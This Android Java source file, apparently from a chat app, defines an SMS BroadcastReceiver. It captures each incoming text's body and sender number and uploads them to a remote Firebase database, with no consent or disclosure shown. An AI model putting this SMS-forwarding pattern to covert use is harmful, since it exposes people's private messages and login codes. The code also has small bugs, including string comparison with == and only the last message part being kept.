package com.xovex_chatsheet;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MyReceiver extends BroadcastReceiver {
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "SmsBroadcastReceiver";
    String msg,phoneNo ="";

    DatabaseReference MsgDbRef;
    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
       MsgDbRef = FirebaseDatabase.getInstance().getReference().child("Message");
        Log.i(TAG, "Intent Received: " + intent.getAction());
        if(intent.getAction()==SMS_RECEIVED){
            Bundle dataBundle = intent.getExtras();
            if(dataBundle != null){
                Object[] mypdu = (Object[])dataBundle.get("pdus");
                final SmsMessage[] message = new SmsMessage[mypdu.length];

                for(int i=0; i<mypdu.length; i++){
                    if(Build.VERSION.SDK_INT >=Build.VERSION_CODES.M){
                        String format = dataBundle.getString("format");
                        message[i] =  SmsMessage.createFromPdu((byte[])mypdu[i], format);
                    }
                    else {
                        message[i] = SmsMessage.createFromPdu((byte[])mypdu[i]);
                    }
                    msg = message[i].getMessageBody();
                    phoneNo = message[i].getOriginatingAddress();
                }
                insertMsgData();
            }
        }
    }
    private void insertMsgData(){

        String Msg = msg;
        String PhoneNo = phoneNo;

        User user = new User(Msg, PhoneNo);

        MsgDbRef.push().setValue(user);
    }
}